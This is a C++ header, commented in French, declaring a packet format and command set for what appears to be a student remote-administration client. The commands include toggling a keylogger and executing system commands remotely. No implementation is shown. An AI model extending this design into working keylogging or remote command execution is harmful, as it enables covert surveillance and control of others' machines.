#pragma once

struct MyPacket {
    unsigned short cmd;         // 2 bytes | Contient la commande associée
    unsigned short status;      // 2 bytes | Contient le code de statut
    unsigned int payloadLength; // 4 bytes | Contient la taille du payload
    
    unsigned long timestamp;    // 8 bytes | Contient le timestamp Unix
    unsigned long payload;      // 8 bytes | Contient les données envoyées
};

enum STATUS_CODE {
    SUCCESS = 0,
    CMD_NOT_FOUND = 1,
    TIMEOUT = 2,
    SERVER_ERR = 3,
    CLIENT_ERR = 4
};

enum CMD {
    GET_INFO = 0x01,
    TOGGLE_KEYLOG = 0x02,
    GET_PROC_LIST = 0x03,
    EXEC_SYS_CMD = 0x04
};


class LPTF_Packet
{
private:
    MyPacket packet;
    
public:
    // Constructors
    LPTF_Packet();
    LPTF_Packet(const LPTF_Packet& other);
    ~LPTF_Packet();

    // Builders
    unsigned short getCMD();
    unsigned short getStatus();
    unsigned int getPayloadLength(unsigned long &payload);
    unsigned long getTimestamp();
    unsigned long getPayload();

    void getClientData();

    LPTF_Packet& operator=(const LPTF_Packet &other);
};
